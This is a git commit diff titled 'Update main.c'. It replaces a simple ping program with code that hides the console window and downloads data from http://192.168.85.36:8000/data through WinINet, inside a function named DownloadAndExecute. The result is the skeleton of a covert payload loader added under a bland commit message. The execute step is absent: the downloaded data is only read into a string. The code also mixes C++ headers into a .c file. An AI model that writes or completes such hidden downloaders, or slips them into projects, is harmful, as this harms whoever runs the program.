94802756130a567b391aee7169e9e1fca9cb0962
amir-h <132480878+amir5290@users.noreply.github.com>
2026-09-14 10:44:10 +0330

    Update main.c

--- main.c
+++ main.c
@@ -1,6 +1,36 @@
-#include <stdlib.h>
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <vector>
+#include <string>
+
+#pragma comment(lib, "wininet.lib")
+
+
+
+void DownloadAndExecute() {
+    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hFile = InternetOpenUrlA(hInternet, "http://192.168.85.36:8000/data", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+
+    if (hFile) {
+        char buffer[1024];
+        DWORD bytesRead;
+        std::string rawData;
+
+        while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+            rawData.append(buffer, bytesRead);
+        }
+
+        
+        
+        InternetCloseHandle(hFile);
+    }
+    InternetCloseHandle(hInternet);
+}
 
 int main() {
-    system("cmd /k ping google.com");
+    
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    DownloadAndExecute();
     return 0;
 }
